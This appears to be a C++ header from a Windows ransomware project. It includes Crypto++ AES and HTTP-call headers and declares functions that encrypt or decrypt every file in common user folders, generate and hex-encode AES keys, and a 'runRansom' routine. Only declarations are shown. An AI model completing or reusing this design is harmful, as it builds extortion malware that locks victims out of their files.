#include <iostream>
#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <utility>
#include "../include/shared.h"
#include "../include/http_calls.h"
#include "../../libs/cryptopp/headers/hex.h"
#include "../../libs/cryptopp/headers/aes.h"
#include "../../libs/cryptopp/headers/modes.h"
#include "../../libs/cryptopp/headers/filters.h"
#include "../../libs/cryptopp/headers/files.h"
#include "../../libs/cryptopp/headers/osrng.h"
#include "../../libs/cryptopp/headers/secblock.h"  // for SecByteBlock

void AESEncryptCBC(const std::string& inputFilePath, const std::string& outputFilePath,
    const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv);
void AESDecryptCBC(const std::string& inputFilePath, const std::string& outputFilePath,
    const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv);
std::string getCommonFolderPath(int csidl);
void encryptAllFilesInDirectory(const std::string& directoryPath,
    const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv);
void decryptAllFilesInDirectory(const std::string& directoryPath,
    const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv);
std::pair<CryptoPP::SecByteBlock, CryptoPP::SecByteBlock> GenerateAESKeyAndIV();
std::string SecByteBlockToHexString(const CryptoPP::SecByteBlock& block);
void runRansom();